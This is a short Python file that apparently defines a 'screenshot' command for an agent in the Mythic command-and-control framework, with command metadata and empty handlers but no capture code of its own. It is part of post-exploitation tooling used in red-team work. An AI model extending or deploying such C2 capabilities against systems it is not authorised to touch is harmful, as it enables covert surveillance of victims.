from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class Screenshotrguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "It creates a screeenshot of the current screen and returns it as an artifact."
    version = 1
    supported_ui_features = []
    author = "@PatchRequest"
    attackmapping = []
    argument_class = Screenshotrguments
    attributes = CommandAttributes(
        builtin=True
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)